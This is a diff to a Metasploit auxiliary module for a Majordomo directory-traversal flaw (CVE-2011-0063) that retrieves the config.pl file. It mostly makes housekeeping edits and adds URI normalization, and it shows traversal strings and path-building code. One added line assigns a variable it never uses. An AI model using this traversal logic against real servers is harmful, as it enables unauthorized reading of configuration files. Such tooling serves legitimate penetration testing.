@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -26,7 +22,6 @@ class Metasploit3 < Msf::Auxiliary
 				module will attempt to download the Majordomo config.pl file.
 			},
 			'Author'         =>	['Nikolas Sotiriu'],
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					['OSVDB', '70762'],
@@ -34,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
 					['CVE', '2011-0063'],
 					['URL', 'https://sitewat.ch/en/Advisory/View/1'],
 					['URL', 'http://sotiriu.de/adv/NSOADV-2011-003.txt'],
-					['EDB', 16103]
+					['EDB', '16103']
 				],
 			'DisclosureDate' => 'Mar 08 2011',
 			'License'        =>  MSF_LICENSE
@@ -49,6 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
+		uri = normalize_uri(datastore['URI'])
 		"http://#{vhost}:#{rport}#{datastore['URI']}"
 	end
 
@@ -57,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 			'../',
 			'./.../'
 		]
-		uri  = datastore['URI']
+		uri  = normalize_uri(datastore['URI'])
 		file = datastore['FILE']
 		deep = datastore['DEPTH']
 		file = file.gsub(/^\//, "")
